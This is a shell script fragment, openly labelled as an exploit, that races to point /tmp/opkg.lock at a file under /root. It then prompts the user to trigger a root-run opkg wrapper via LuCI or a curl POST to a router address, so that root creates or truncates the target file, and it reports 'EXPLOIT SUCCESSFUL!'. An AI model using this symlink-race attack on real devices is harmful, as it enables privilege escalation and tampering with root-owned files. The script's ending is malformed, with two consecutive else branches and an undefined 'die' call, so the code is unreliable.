target="/root/ROOT_OWNED_BY_OPKG_WRAPPER_NOW.txt"                                                                                                                                                                  
junk=$(printf '%2000d' 1)  # force tmp files to be non-empty so they're included                                                                                                                                   
                                                                                                                                                                                                                   
# Step 1: Win race to make /tmp/opkg.lock point to our target                                                                                                                                                      
echo "[+] Waiting to win race and point lock at $target ..."                                                                                                                                                       
while :; do                                                                                                                                                                                                        
        ln -sf "$target" /tmp/opkg.lock 2>/dev/null && break                                                                                                                                                       
        rm -f /tmp/opkg.lock 2>/dev/null                                                                                                                                                                           
        usleep 50000 2>/dev/null || sleep 0.05                                                                                                                                                                     
done                                                                                                                                                                                                               
                                                                                                                                                                                                                   
# Step 2: Trigger the root-run opkg wrapper (e.g. via LuCI or direct call)                                                                                                                                         
#     We need to run something like: /usr/libexec/opkg-call.sh install somepkg                                                                                                                                     
#     But we don't care if it succeeds — we only care that it runs once.                                                                                                                                           
                                                                                                                                                                                                                   
echo "[+] Symlink planted. Now trigger the opkg wrapper as root (via LuCI or curl)"                                                                                                                                
echo "    Example: curl -k -d 'action=install&package=luci' http://192.168.1.1/cgi-bin/luci/admin/system/packages"                                                                                                 
                                                                                                                                                                                                                   
# Step 3: Wait and celebrate                                                                                                                                                                                       
sleep 3                                                                                                                                                                                                            
                                                                                                                                                                                                                   
if [ -f "$target" ]; then                                                                                                                                                                                          
        echo "EXPLOIT SUCCESSFUL!"
        echo "File $target was created/truncated and written by root:"
        ls -la "$target"
        echo "First 200 bytes:"
        head -c 200 "$target" | hexdump -C
else
        echo "[-] Failed — file not created (race lost or script changed)"

else
    die "Exploit failed - race lost or opkg-call not triggered"
fi
